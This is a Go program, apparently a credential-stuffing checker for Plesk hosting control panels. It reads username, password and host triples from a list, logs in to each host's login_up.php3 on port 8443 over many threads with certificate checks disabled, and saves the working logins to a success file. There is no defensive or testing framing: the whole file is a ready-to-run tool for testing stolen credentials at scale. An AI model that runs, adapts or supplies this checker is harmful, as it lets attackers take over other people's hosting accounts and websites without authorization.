package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"sync"
)

func checkPleskAccount(host, username, password string, results chan string, wg *sync.WaitGroup, semaphore chan struct{}) {
	defer wg.Done()
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	baseURL := fmt.Sprintf("https://%s:8443", host)
	loginURL := baseURL + "/login_up.php3"

	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	formData := url.Values{
		"login_name": {username},
		"passwd":     {password},
		"submit":     {"Login"},
	}

	resp, err := client.PostForm(loginURL, formData)
	if err != nil {
		results <- fmt.Sprintf("[FAILED] - %s:%s:%s", username, password, host)
		return
	}
	defer resp.Body.Close()

	if resp.Request.URL.Path == "/login_up.php3" {
		results <- fmt.Sprintf("[FAILED] - %s:%s:%s", username, password, host)
		return
	}

	results <- fmt.Sprintf("[SUCCESS] - %s:%s:%s", username, password, host)
}

func main() {
	var threadCount int
	fmt.Print("Enter number of threads: ")
	fmt.Scan(&threadCount)

	file, err := os.Open("list.txt")
	if err != nil {
		fmt.Println("[ERROR] Failed to open list.txt:", err)
		return
	}
	defer file.Close()

	os.MkdirAll("result", os.ModePerm)
	successFile, _ := os.Create("result/Success.txt")
	defer successFile.Close()
	failedFile, _ := os.Create("result/Failed.txt")
	defer failedFile.Close()

	results := make(chan string, 100)
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, threadCount)

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) != 3 {
			fmt.Printf("[WARNING] Skipping invalid line: %s\n", line)
			continue
		}

		username := parts[0]
		password := parts[1]
		host := parts[2]

		wg.Add(1)
		go checkPleskAccount(host, username, password, results, &wg, semaphore)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	for result := range results {
		fmt.Println(result)
		if strings.HasPrefix(result, "[SUCCESS]") {
			successFile.WriteString(strings.TrimPrefix(result, "[SUCCESS] - ") + "\n")
		} else {
			failedFile.WriteString(strings.TrimPrefix(result, "[FAILED] - ") + "\n")
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("[ERROR] Failed to read list.txt:", err)
	}

	fmt.Println("Done")
}
